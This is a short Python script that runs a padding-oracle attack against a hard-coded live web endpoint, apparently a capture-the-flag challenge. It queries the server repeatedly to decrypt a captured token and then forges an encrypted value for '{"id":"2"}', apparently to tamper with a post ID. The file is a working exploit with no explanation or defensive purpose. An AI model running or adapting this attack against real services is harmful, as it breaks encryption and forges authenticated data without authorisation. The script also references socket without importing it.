import os
from padding_oracle import PaddingOracle
from Crypto.Cipher import AES
from Crypto import Random
from base64 import b64encode, b64decode
import requests
import time



def test():

    def removeSpecialChars(s):
        return s.replace('~', '=').replace('!', '/').replace('-', '+')


    def addSpecialChars(s):
        return s.replace('=', '~').replace('/', '!').replace('+', '-')

    class PaddingTest(PaddingOracle):
        def isValidPadding(self, dataBytes):
            data = addSpecialChars(b64encode(dataBytes).decode())
            while 1:
                try:
                    response = requests.get('http://35.227.24.107:5001/86287c6556/?post=' + data)
                    return 'padding' not in response.text.lower()
                except (socket.error, requests.exceptions.RequestException):
                    #time.sleep(2.0)
                    continue

    # decrypt
    BLOCK_SIZE = 16
    paddingTest = PaddingTest(16)
    data = removeSpecialChars('4HIEfIDCZJYeVWlALduiG6IHaununN7GhyC2STj!!j80UqAR7Tu4RrRb9DjneJNk6bHMQQYXSZf0GRO5CL8BcOLxKcja!XEaHxiXmVYPhGpYGNXzxa08I2uRa8amPobUJKjLAIl0nUsJVm8efU0JDqyUWq366GvB1jwlM8n8KDl7bDDai319l9jyK9UIxc2Is1xIMaE2lufHLccPUK2sDA~~')
    #decrypted = paddingTest.decrypt(data)
    #print(decrypted)
    encrypted = paddingTest.encrypt('{"id":"2"}')
    print(addSpecialChars(b64encode(encrypted).decode()))

test()
